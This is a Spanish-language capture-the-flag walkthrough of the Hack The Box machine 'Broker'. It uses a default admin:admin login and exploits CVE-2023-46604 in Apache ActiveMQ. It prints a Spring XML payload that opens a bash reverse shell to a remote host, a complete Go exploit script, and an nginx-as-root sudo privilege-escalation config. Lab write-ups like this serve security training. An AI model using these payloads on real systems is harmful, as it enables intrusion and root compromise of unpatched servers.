---
title: Broker 
layout: page
permalink: /HTB_Broker
---

<h2 class="amarillo">Broker</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/Broker/broker.png" alt="under" oncontextmenu="return false;">
</div>

Encendemos la máquina Broker y obtenemos la dirección ip 10.129.230.87, para validar que esta encendida y si estamos frente a un sistema Linux o un Windows le enviaremos 5 trazas ICMP.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Broker/1.png" alt="under" oncontextmenu="return false;">
</div>

La máquina está encendida y tiene un TTL de 63, por tanto estamos frente a un sistema Linux.

# Enumeración
Para la enumeración hacemos uso de nmap para identificar que puertos están abiertos con: `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.230.87`.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Broker/2.png" alt="under" oncontextmenu="return false;">
</div>

Vemos varios puertos abiertos, pero primero enumeramos el puerto 80 con la herramienta whatweb para identificar las tecnologías que esta utilizando el sitio web.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Broker/3.png" alt="under" oncontextmenu="return false;">
</div>

Con esta información, vemos una tecnología llamada ActiveMQRealm y nos lleva a un panel de login.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Broker/4.png" alt="under" oncontextmenu="return false;">
</div>

No disponemos de credenciales válidas, sin embargo, podemos hacer uso de credenciales por defecto como *admin:admin*.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Broker/5.png" alt="under" oncontextmenu="return false;">
</div>

Y nos encontramos con el index del sitio ActiveMQ, revisando en Internet si existe alguna vulnerabilidad asociada a ActiveMQ encontramos que tiene el CVE-2023-46604:
```c
CVE-2023-46604 is a vulnerability in the Java OpenWire protocol marshaller used by Apache ActiveMQ, which allows remote code execution by attackers with network access to the broker or client. Users are advised to upgrade to the latest versions to mitigate this security risk.
The vulnerability arises from unsafe deserialization practices within the OpenWire protocol. An attacker can exploit this by sending a crafted request to the server, which may lead to executing arbitrary shell commands.
```

La deserializacion se puede construir de la siguiente manera:
```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

Más allá de la prueba de concepto con xml, aquí comparto el script en go que utiliza el xml del poc: https://github.com/X1r0z/ActiveMQ-RCE

> Se construye y se envía un paquete malicioso serializado usando el protocolo openwire de activeqm, el payload trabaja serializando la clase `org.springframework.context.support.ClassPathXmlApplicationContext` con la URL que le pasemos. Por tanto, la vulnerabilidad existe porque ActiveMQ deserializa objetos Java sin validación adecuada en el protocolo OpenWire, y la clase de Spring Framework tiene un constructor que acepta una URL como parámetro y automáticamente carga y parsea el archivo XML de esa ubicación durante la instanciación, ejecutando nuestro XML gracias a ProcessBuilder.

```go
package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"net"
	"strconv"
)

func main() {
	var (
		ip   string
		port string
		url  string
	)
	flag.StringVar(&ip, "i", "", "ActiveMQ Server IP or Host")
	flag.StringVar(&port, "p", "61616", "ActiveMQ Server Port")
	flag.StringVar(&url, "u", "", "Spring XML Url")
	flag.Parse()

	if ip == "" || url == "" {
		flag.Usage()
		return
	}

	className := "org.springframework.context.support.ClassPathXmlApplicationContext"
	message := url

	header := "1f00000000000000000001"
	body := header + "01" + int2Hex(len(className), 4) + string2Hex(className) + "01" + int2Hex(len(message), 4) + string2Hex(message)
	payload := int2Hex(len(body)/2, 8) + body
	data, _ := hex.DecodeString(payload)

	fmt.Println("[*] Target:", ip+":"+port)
	fmt.Println("[*] XML URL:", url)
	fmt.Println()
	fmt.Println("[*] Sending packet:", payload)

	conn, _ := net.Dial("tcp", ip+":"+port)
	conn.Write(data)
	conn.Close()
}

func string2Hex(s string) string {
	return hex.EncodeToString([]byte(s))
}

func int2Hex(i int, n int) string {
	if n == 4 {
		return fmt.Sprintf("%04s", strconv.FormatInt(int64(i), 16))
	} else if n == 8 {
		return fmt.Sprintf("%08s", strconv.FormatInt(int64(i), 16))
	} else {
		panic("n must be 4 or 8")
	}
}
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Broker/6.png" alt="under" oncontextmenu="return false;">
</div>

Con esto habremos conseguido una reverse shell a la máquina, solo queda hacer un tratamiento de la TTY y escalar privilegios. Nos vamos al directorio principal con cd y veremos la flag del usuario.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Broker/7.png" alt="under" oncontextmenu="return false;">
</div>

Para escalar privilegios vemos que al hacer sudo -l tenemos privilegio sobre el binario de nginx, podemos crear un servicio nginx como root que hosteará la raíz del sistema y podremos movernos a través de un directory listing:
```nginx
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1339;
        root /;
        autoindex on;
    }
}
```
Para ejecutar el servicio nginx hacemos `sudo /usr/sbin/nginx -c /dev/shm/privesc-nginx.conf`, de esta forma si accedemos al puerto 1339 como configuramos en el .conf file, podremos listar información del sistema como root y veremos la flag.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Broker/8.png" alt="under" oncontextmenu="return false;">
</div>




